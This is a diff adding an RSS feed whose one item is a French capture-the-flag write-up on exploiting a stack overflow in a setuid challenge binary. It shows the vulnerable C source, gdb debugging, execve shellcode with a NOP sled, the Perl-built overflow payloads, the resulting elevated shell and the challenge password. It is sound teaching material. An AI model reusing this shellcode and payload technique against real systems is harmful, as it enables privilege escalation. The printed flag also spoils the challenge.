@@ -1,0 +1,293 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Code on ngup, stfu, rtfm &amp; KISS</title>
+    <link>http://github.unix4fun.io/tags/code/</link>
+    <description>Recent content in Code on ngup, stfu, rtfm &amp; KISS</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; unix4fun 2016.&lt;br&gt;All rights reserved.</copyright>
+    <lastBuildDate>Fri, 23 Sep 2016 07:38:13 +0200</lastBuildDate>
+    <atom:link href="http://github.unix4fun.io/tags/code/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Exploiter un stack overflow à l&#39;ancienne.</title>
+      <link>http://github.unix4fun.io/post/exploiter-un-stack-overflow/</link>
+      <pubDate>Fri, 23 Sep 2016 07:38:13 +0200</pubDate>
+      
+      <guid>http://github.unix4fun.io/post/exploiter-un-stack-overflow/</guid>
+      <description>&lt;p&gt;Youpla la compagnie! Ça fait un bail non? :) Bon, récemment je me suis mis à regarder un peu les vieilles failles de sécu des années 90&amp;rsquo;/début 2000. Ok ok, de nos jours c&amp;rsquo;est complètement différent, on a des milliards de protections (PIE, ASLR, relro, stack canary, etc). Mais pour ma culture générale, j&amp;rsquo;ai voulu regarder. J&amp;rsquo;ai donc cherché sur google un site proposant des challenges, et je suis tombé sur l&amp;rsquo;un d&amp;rsquo;eux qui est vraiment bien fichu: il propose une dizaine de catégories (web, cryptanalyse, crackme, exploitation système, etc). Il propose de se connecter sur des machines où l&amp;rsquo;environnement est déjà préparé, etc.&lt;/p&gt;
+
+&lt;p&gt;NOTE: je ne le nomme pas, non pas pour ne pas faire de la publicité, mais parce qu&amp;rsquo;en traînant un peu mes guêtre par là, les administrateurs n&amp;rsquo;aiment pas trop que les solutions se trouvent trop facilement sur le net. Donc je vais tenter de rendre la recherche de solution un peu plus compliquée tout en restant cohérent (j&amp;rsquo;espère).&lt;/p&gt;
+
+&lt;p&gt;Donc jy bondis:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;maison$ ssh -p 2222 user@&amp;lt;hostname&amp;gt;
+[...]
+$ ls -la
+total 28
+dr-xr-x---  2 user-cracked user          4096 May 21  2015 .
+drwxr-xr-x 22 root root                  4096 Mar  2  2016 ..
+-r-sr-x---  1 user-cracked user         10511 May  4  2013 prog
+-r--r-----  1 user         user          1277 Jan  7  2011 prog.c
+-r--r-----  1 user-cracked user-cracked    13 Feb  8  2012 .passwd
+$ id
+uid=1110(user) gid=1110(user) groups=1110(user),100(users)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;L&amp;rsquo;objectif ici est d&amp;rsquo;exécuter le programme &amp;ldquo;prog&amp;rdquo;, qui est setuid, et de l&amp;rsquo;exploiter pour pouvoir lire le contenu du fichier .passwd.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cat prog.c
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;ctype.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+
+#define BUFFER 512
+
+struct Init
+{
+    char username[128];
+    uid_t uid;
+    pid_t pid;
+};
+
+void cpstr(char *dst, const char *src)
+{
+    for(; *src; src++, dst++)
+        {
+            *dst = *src;
+        }
+    *dst = 0;
+}
+
+void chomp(char *buff)
+{
+    for(; *buff; buff++)
+        {
+            if(*buff == &#39;\n&#39; || *buff == &#39;\r&#39; || *buff == &#39;\t&#39;)
+            {
+            *buff = 0;
+            break;
+            }
+        }
+}
+
+struct Init Init(char *filename)
+{
+
+    FILE *file;
+    struct Init init;
+    char buff[BUFFER+1];
+
+
+    if((file = fopen(filename, &amp;quot;r&amp;quot;)) == NULL)
+        {
+            perror(&amp;quot;[-] fopen &amp;quot;);
+            exit(0);
+        }
+
+    memset(&amp;amp;init, 0, sizeof(struct Init));
+
+    init.pid = getpid();
+    init.uid = getuid();
+
+    while(fgets(buff, BUFFER, file) != NULL)
+        {
+            chomp(buff);
+            if(strncmp(buff, &amp;quot;USERNAME=&amp;quot;, 9) == 0)
+            {
+                cpstr(init.username, buff+9);
+            }
+        }
+    fclose(file);
+    return init;
+}
+
+int main(int argc, char **argv)
+{
+    struct Init init;
+    if(argc != 2)
+        {
+            printf(&amp;quot;Usage : %s &amp;lt;config_file&amp;gt;\n&amp;quot;, argv[0]);
+            exit(0);
+        }
+    init = Init(argv[1]);
+    printf(&amp;quot;[+] Runing the program with username %s, uid %d and pid %d.\n&amp;quot;, init.username, init.uid, init.pid);
+
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Visiblement dans ce challenge on a un stack overflow classique dans cpstr(),mais en plus il faut faire attention à préserver certaines valeurs sur la pile. En effet dans Init(), on peut voir un:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fclose(file);
+return init;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si on ne fait pas attention à ce que `file&amp;rsquo; ait une valeur correcte, l&amp;rsquo;appel à fclose() va faire crasher l&amp;rsquo;application avant le return, et nous empêcher d&amp;rsquo;exploiter l&amp;rsquo;overflow.&lt;/p&gt;
+
+&lt;p&gt;Typiquement le contenu du fichier devrait alors être de cette forme:&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;USERNAME=&amp;rdquo; [JUNK pour remplir le buffer] &amp;hellip; [file pointer] &amp;hellip; [ new eip ]&lt;/p&gt;
+
+&lt;p&gt;Avec `new eip qui doit écraser $eip, et sauter dans du code qu&amp;rsquo;on veut donc faire exécuter.&lt;/p&gt;
+
+&lt;p&gt;Comme notre overflow va écraser les autres éléments de la structure Init, on va faire en sorte de mettre des valeurs qui facilitent le debug: -1 pour l&amp;rsquo;uid et -2 pour le pid.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ mkdir /tmp/prout &amp;amp;&amp;amp; export binpath=/tmp/prout/foo.bin
+$ export uid=&amp;quot;\xff\xff\xff\xff&amp;quot;
+$ export pid=&amp;quot;\xfe\xff\xff\xff&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On va faire tourner le programme dans gdb afin de savoir la valeur retournée par fopen(), pour la restaurer avant le fclose():&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ gdb ./prog
+[...]
+gdb$ disas Init
+[...]
+    0x080485bd &amp;lt;+20&amp;gt;:    mov    DWORD PTR [esp+0x4],edx
+    0x080485c1 &amp;lt;+24&amp;gt;:    mov    DWORD PTR [esp],eax
+    0x080485c4 &amp;lt;+27&amp;gt;:    call   0x8048480 &amp;lt;fopen@plt&amp;gt;
+    0x080485c9 &amp;lt;+32&amp;gt;:    mov    DWORD PTR [ebp-0x1c],eax
+[...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On met donc un breakpoint juste apres le &lt;em&gt;fopen()&lt;/em&gt; pour connaître la valeur du pointeur (en général les valeurs de retour sont dans $eax, et la ligne +24 nous le confirme, puisqu&amp;rsquo;on empile le contenu de $eax pour passer cette valeur à &lt;em&gt;fclose()&lt;/em&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;gdb$ b *0x080485c9
+Breakpoint 1 at 0x80485c9: file binary10.c, line 45.
+gdb$ r /tmp/prout/foo.bin
+[...]
+Breakpoint 2, 0x080485c9 in Init (filename=0xbffffc80 &amp;quot;/tmp/prout/foo.bin&amp;quot;) at binary10.c:45
+45      in prog.c
+gdb$ i r eax
+eax            0x804b008        0x804b008
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On est content, on a la valeur du FILE * qu&amp;rsquo;on désire sauver:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ export fileptr=&amp;quot;\x08\xb0\x04\x08&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ensuite on exporte notre shellcode (on peut en trouver partout sur le net)&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ export shellcode=$(perl -e &#39;print &amp;quot;\x90&amp;quot;x128 . &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On écrit ensuite un petit programme pour récupérer l&amp;rsquo;adresse d&amp;rsquo;une variable d&amp;rsquo;environnement donnée, pour un programme donné (on se met dans un répertoire avec les droits d&amp;rsquo;écriture &amp;ndash; par exemple dans /tmp):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cat getenv.c
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int
+main(int argc, char **argv)
+{
+        char *p = NULL;
+
+        if(argc &amp;lt; 3) {
+                fprintf(stderr, &amp;quot;Usage: %s &amp;lt;env name&amp;gt; &amp;lt;binary&amp;gt;\n&amp;quot;, argv[0]);
+                return EXIT_FAILURE;
+        }
+
+        p = getenv(argv[1]);
+        p += (strlen(argv[0]) - strlen(argv[2])) * 2;
+        printf(&amp;quot;%s is set at %p\n&amp;quot;, argv[1], (void *) p);
+
+        return EXIT_SUCCESS;
+}
+$ cc -o getenv getenv.c -m32
+$ ./getenv shellcode $HOME/prog
+0xbffffd47
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok! Enfin on peut tester ce programme!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ perl -e &#39;print &amp;quot;USERNAME=&amp;quot; . &amp;quot;A&amp;quot;x128 . &amp;quot;&#39;$uid&#39;&amp;quot; . &amp;quot;&#39;$pid&#39;&amp;quot; . &amp;quot;&#39;$fileptr&#39;&amp;quot; . &amp;quot;B&amp;quot;x32 . &amp;quot;\x47\xfd\xff\xbf&amp;quot;&#39; &amp;gt; &amp;quot;$binpath&amp;quot;  &amp;amp;&amp;amp; ./ch10 &amp;quot;$binpath&amp;quot;
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Pour avoir des infos supplémentaires je copie le binaire dans /tmp/prout:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cp ./prog /tmp/prout
+$ ulimit -c unlimited
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Maintenant un SIGSEGV me donnera quelque chose a manger:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ perl -e &#39;print &amp;quot;USERNAME=&amp;quot; . &amp;quot;A&amp;quot;x128 . &amp;quot;&#39;$uid&#39;&amp;quot; . &amp;quot;&#39;$pid&#39;&amp;quot; . &amp;quot;&#39;$fileptr&#39;&amp;quot; . &amp;quot;B&amp;quot;x32 . &amp;quot;\x47\xfd\xff\xbf&amp;quot;&#39; &amp;gt; &amp;quot;$binpath&amp;quot;  &amp;amp;&amp;amp; ./ch10 &amp;quot;$binpath&amp;quot;
+Segmentation fault (core dumped)
+$ gdb ./prog core
+Core was generated by `./prog /tmp/prout/foo.bin&#39;.
+Program terminated with signal 11, Segmentation fault.
+#0  0x42424242 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ah? Je me serais planté de 4 bytes pour l&amp;rsquo;adresse dans la stack ou je devrais écraser $eip? Ok&amp;hellip; bon ben on décale alors, histoire de faire coïncider l&amp;rsquo;adresse du shellcode dans l&amp;rsquo;environnement avec $eip. On insère donc 28x&amp;rdquo;B&amp;rdquo; au lieu de 32, et on rajoute un gentil petit canary apres l&amp;rsquo;adresse, au cas où.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ perl -e &#39;print &amp;quot;USERNAME=&amp;quot; . &amp;quot;A&amp;quot;x128 . &amp;quot;&#39;$uid&#39;&amp;quot; . &amp;quot;&#39;$pid&#39;&amp;quot; . &amp;quot;&#39;$fileptr&#39;&amp;quot; . &amp;quot;B&amp;quot;x28 . &amp;quot;\x47\xfd\xff\xbf&amp;quot; . &amp;quot;C&amp;quot;x4&#39; &amp;gt; &amp;quot;$binpath&amp;quot;  &amp;amp;&amp;amp; ./prog &amp;quot;$binpath&amp;quot;
+Segmentation fault (core dumped)
+[...]
+Core was generated by `./prog /tmp/prout/foo.bin&#39;.
+Program terminated with signal 11, Segmentation fault.
+#0  0x080486aa in Init (filename=0xbffffb00 &amp;quot;T\377\377\277u\377\377\277~\377\377\277\227\377\377\277\316\377\377\277\327\377\377\277\354\377\377\277&amp;quot;) at binary10.c:65
+65      binary10.c: No such file or directory.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Euh? Bon, si on regarde le code assembleur, on remarque que l&amp;rsquo;épilogue de la fonction Init() est différent de l&amp;rsquo;ordinaire. De même que dans main(), on réserve de la place pour le &amp;lsquo;struct Init Init&amp;rsquo; qui sera retourné par Init() Donc l&amp;rsquo;espace sur la stack va être écrasé par la copie de l&amp;rsquo;objet de type &amp;lsquo;struct init&amp;rsquo;&amp;hellip; ce qui va écraser tout ce qu&amp;rsquo;on avait pris soin de construire avec nos petits doigts boudinés. En effet, en sortie de Init(), on a:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[...]
+0x08048699 &amp;lt;+240&amp;gt;:   lea    ebx,[ebp-0xa4]
+0x0804869f &amp;lt;+246&amp;gt;:   mov    eax,0x22
+0x080486a4 &amp;lt;+251&amp;gt;:   mov    edi,edx
+0x080486a6 &amp;lt;+253&amp;gt;:   mov    esi,ebx
+0x080486a8 &amp;lt;+255&amp;gt;:   mov    ecx,eax
+0x080486aa &amp;lt;+257&amp;gt;:   rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
+0x080486ac &amp;lt;+259&amp;gt;:   mov    eax,DWORD PTR [ebp+0x8]
+0x080486af &amp;lt;+262&amp;gt;:   add    esp,0x2ac
+0x080486b5 &amp;lt;+268&amp;gt;:   pop    ebx
+0x080486b6 &amp;lt;+269&amp;gt;:   pop    esi
+0x080486b7 &amp;lt;+270&amp;gt;:   pop    edi
+0x080486b8 &amp;lt;+271&amp;gt;:   pop    ebp
+0x080486b9 &amp;lt;+272&amp;gt;:   ret    0x4
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On fait encore quelques tests, en mettant que des \x47\xfd\xff\xbf a la place des &amp;ldquo;B&amp;rdquo;, pour valider cette hypothèse:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ perl -e &#39;print &amp;quot;USERNAME=&amp;quot; . &amp;quot;A&amp;quot;x128 . &amp;quot;&#39;$uid&#39;&amp;quot; . &amp;quot;&#39;$pid&#39;&amp;quot; . &amp;quot;&#39;$fileptr&#39;&amp;quot; . &amp;quot;\x47\xfd\xff\xbf&amp;quot;x8 . &amp;quot;C&amp;quot;x4&#39; &amp;gt; &amp;quot;$binpath&amp;quot;  &amp;amp;&amp;amp; ./prog &amp;quot;$binpath&amp;quot;
+Illegal instruction (core dumped)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Bon! Inspectons ça un peu mieux: on met un breakpoint juste avant le `ret&amp;rsquo; de la fonction Init(), puis on exécute une instruction:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;gdb$ ni
+0xbffffd47 in ?? ()
+
+gdb$ x/16x 0xbffffd47
+0xbffffd47:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffd57:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffd67:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffd77:     0x41414141      0x41414141      0x41414141      0x41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Hop, direct dans le buffer&amp;hellip; Du coup, l&amp;rsquo;idée est que plutôt d&amp;rsquo;utiliser une variable d&amp;rsquo;environnement à l&amp;rsquo;adresse de laquelle on souhaite sauter, on va directement insérer notre shellcode dans le buffer init.username qu&amp;rsquo;on remplit en lisant le fichier. Comme le buffer fait 128 bytes et que le shellcode fait 25 bytes, on préfixe avec 103 NOP (0x90), et on termine avec ce qu&amp;rsquo;on souhaite faire exécuter:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ export shbuf=$(perl -e &#39;print &amp;quot;\x90&amp;quot;x103 . &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;&#39;)
+$ perl -e &#39;print &amp;quot;USERNAME=&amp;quot; . &amp;quot;&#39;$shbuf&#39;&amp;quot; . &amp;quot;&#39;$uid&#39;&amp;quot; . &amp;quot;&#39;$pid&#39;&amp;quot; . &amp;quot;&#39;$fileptr&#39;&amp;quot; . &amp;quot;B&amp;quot;x28 . &amp;quot;\x47\xfd\xff\xbf&amp;quot;x2&#39; &amp;gt; &amp;quot;$binpath&amp;quot;  &amp;amp;&amp;amp; ./prog&amp;quot;$binpath&amp;quot;
+sh-4.2$
+sh-4.2$ id
+uid=1110(user) gid=1110(user) euid=1210(user-cracked) groups=1210(user-cracked),100(users),1110(user)
+sh-4.2$ cat .passwd
+Tirelipimponsurlechiwawa!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Et youpi les knackis, on peut valider ce challenge!&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
